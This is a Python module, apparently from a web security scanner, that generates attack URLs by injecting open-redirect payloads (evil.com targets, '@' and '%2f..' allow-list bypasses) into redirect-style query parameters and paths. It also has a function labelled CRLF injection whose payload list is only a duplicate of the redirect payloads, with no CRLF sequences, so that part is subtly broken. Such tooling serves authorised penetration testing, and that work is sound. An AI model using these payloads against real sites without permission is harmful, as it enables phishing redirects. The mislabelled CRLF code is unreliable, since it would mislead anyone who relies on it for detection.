import re
from urllib.parse import urlsplit, urlunsplit

crlf_payloads = [
    "?next=evil.com",
    "?url=evil.com",
    "?target=evil.com",
    "?rurl=evil.com",
    "?dest=evil.com",
    "?redir=evil.com",
    "redirect_uri=evil.com",
    "//www.whitelisteddomain.tld@google.com/%2f..",
    "///google.com/%2f..",
    "///www.whitelisteddomain.tld@google.com/%2f..",
    "////google.com/%2f..",
    "////www.whitelisteddomain.tld@google.com/%2f..",
    "ttps://google.com/%2f.."
]

openredirect_params = [
    "next",
    "url",
    "target",
    "rurl",
    "dest",
    "destination",
    "redir",
    "redirect_uri",
    "redirect_url",
    "redirect",
    "view",
    "image_url",
    "go",
    "return",
    "returnTo",
    "return_to",
    "checkout_url",
    "continue",
    "return_path",
    "to",
    "RedirectTo",
    "next",
    "nextURL",
]

openredirect_payloads = [
    "?next=evil.com",
    "?url=evil.com",
    "?target=evil.com",
    "?rurl=evil.com",
    "?dest=evil.com",
    "?redir=evil.com",
    "redirect_uri=evil.com",
    "//www.whitelisteddomain.tld@google.com/%2f..",
    "///google.com/%2f..",
    "///www.whitelisteddomain.tld@google.com/%2f..",
    "////google.com/%2f..",
    "////www.whitelisteddomain.tld@google.com/%2f..",
    "ttps://google.com/%2f..",


]

def build_openredirect_list(url: str):

    query_param_regex = re.compile(r"([\w\-\_]+=[\w\-\.\_]+)")

    u2 = urlsplit(url)

    if u2.query:
        re_keys = query_param_regex.findall(u2.query)
        keypairs= []
        payload_keypairs = []

        # Transform param=value to {"key": "param", "value": "param_value"}
        # Save all dics to list
        for keypair in re_keys:
            keypair_split = keypair.split("=")
            keypairs.append({"key": keypair_split[0], "value": keypair_split[1]})

        # Transform the keypair dict to {"key": "param": "value": "payload"}
        for op in openredirect_params:
            keys = [k["key"] for k in keypairs]
            if op in keys:
                payload_keypairs.extend([{"key": op, "value": payload} for payload in openredirect_payloads])

        # Change original params to payload params in the URL
        for x in payload_keypairs:
            pattern = re.compile(x["key"] + r"=[\w\-\.\_]+&*")
            sub, count = re.subn(pattern, f"{x['key']}={x['value']}", url)
            if count > 0:
                yield {"url": sub, "type": "openredirect", "payload": x['value']}
    

    elif u2.path:
        path = u2.geturl()
        
        for op_param in openredirect_params:
            pattern = re.compile(fr"{op_param}\/[\w\_\-\.]+\/*")
            for p in openredirect_payloads:
                sub, count = re.subn(pattern, f"{op_param}/{p}", path)
                if count > 0:
                    yield {"url": sub, "type": "openredirect", "payload": p}


    else:
        # Append payload to end of URL
        for payload in openredirect_payloads:
            attack = f"{url}/{payload}"
            yield {"url": attack, "type": "openredirect", "payload": payload}


def build_crlf_list(url: str):
    value_regex = re.compile(r"\w=([\w\-\.\_]+)&*")

    f = value_regex.findall(url)
    u = urlsplit(url)
    attacks= []
    if urlsplit(url).query:
        query = urlsplit(url).query

        # sniper
        for payload in crlf_payloads:
            for p in f:
                attacks.append(query.replace(f"={p}", f"={payload}"))

        injected_queries = list(set(attacks))
        for query in injected_queries:
            injected_url = urlunsplit(u._replace(query=query))
            yield {"url": injected_url, "type": "crlf"}
 
    else:
        for payload in crlf_payloads:
            if not url.endswith("/"):
                injected_url = f"{url}/{payload}"
            else:
                injected_url = f"{url}{payload}"

            yield {"url": injected_url, "type": "crlf"}